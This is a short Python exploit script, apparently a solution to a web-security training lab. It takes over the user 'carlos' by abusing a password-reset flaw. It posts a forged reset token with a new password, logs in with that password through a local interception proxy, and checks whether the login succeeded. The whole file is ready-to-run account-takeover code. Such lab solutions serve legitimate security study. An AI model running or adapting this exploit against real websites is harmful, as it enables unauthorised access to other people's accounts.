import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def access_carlos_account(s, url):

    # Reset Carlos's password
    print("(+) Resetting Carlos's password...")
    password_reset_url = url + "/forgot-password?temp-forgot-password-token=x"
    password_reset_data = {"temp-forgot-password-token": "x", "username": "carlos", "new-password-1": "password", "new-password-2": "password"}
    r = s.post(password_reset_url, data=password_reset_data, verify=False, proxies=proxies)

    # Access Carlos's account
    print("(+) Logging into Carlos's account...")
    login_url = url + "/login"
    login_data = {"username": "carlos", "password": "password"}
    r = s.post(login_url, data=login_data, verify=False, proxies=proxies)

    # Confirm exploit worked
    if "Log out" in r.text:
        print("(+) Successfully logged into Carlos's account.")
    else:
        print("(-) Exploit failed.")
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    
    s = requests.Session()
    url = sys.argv[1]
    access_carlos_account(s, url)

if __name__ == "__main__":
    main()